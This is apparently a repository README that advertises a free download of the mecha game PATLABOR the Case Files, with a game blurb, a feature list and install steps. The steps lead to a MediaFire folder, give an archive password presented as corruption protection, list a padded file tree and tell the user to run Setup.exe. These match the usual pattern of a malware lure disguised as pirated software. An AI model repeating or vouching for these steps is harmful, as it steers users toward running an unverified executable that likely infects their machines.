## 🕹️ About

PATLABOR the Case Files is a 3D mecha action game developed by Chime and published by GOOD SMILE COMPANY. Set in Tokyo, it follows Special Vehicles Section 2 as the police respond to crimes involving industrial robots known as Labors. Play Main Missions as the Patlabor unit or Another Side Missions from the opposing perspective, piloting iconic machines such as the Ingram, Griffon, and Type Zero. More than 20 playable Labors, fully voiced story scenes, and a dedicated Simulator Mode give the game a broad and authentic Patlabor experience.

A strong choice for fans of Patlabor, anime mecha, police science fiction, and focused single-player action.

## ✨ Features

- 🎯 **Simulator Mode** — Practice shooting and challenge Labor-versus-Labor battles outside the main story.
- 🤖 **Iconic Labors** — Pilot more than 20 playable machines, including the Ingram, Griffon, and Type Zero.
- 🎼 **Series Supervision** — Features creative supervision from Yutaka Izubuchi, Kazunori Ito, and Akemi Takada, with music by Kenji Kawai.
- 🚓 **Dual Perspectives** — Experience Main Missions as Special Vehicles Section 2 and Another Side Missions as their adversaries.
- 🎙️ **Fully Voiced Story** — Relive memorable Patlabor scenes through fully voiced story sequences.

### Step 1: Download

Download the game files from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the game expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- audio.res <- Audio resources
|-- driver.umap <- Driver data
|-- physics.sys <- Physics engine
|-- assets.wem <- Asset audio
|-- global.cfg <- Global settings
|-- scripts.lic <- Game scripts
|-- driver.pak <- Driver archive
|-- lang.sys <- Language system
|-- api.pak <- API modules
|-- Password 2026.txt <- Password reminder (empty)
|-- patch_1.bnk <- Audio banks
|-- uninstall.key <- Uninstall key
|-- res.pak <- Resources archive
|-- license.bank <- License data
|-- update_1.ini <- Update config
|-- localization.ini <- Language files
|-- license.wem <- Audio assets
|-- dlc.md5 <- DLC checksums
|-- launcher.dll <- Launcher library
|-- animations.dll <- Animation system
|-- settings.bin <- Configuration
|-- bootstrap.wem <- Bootstrap audio
|-- installer.dat <- Installer data
|-- update_1.res <- Update resources
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
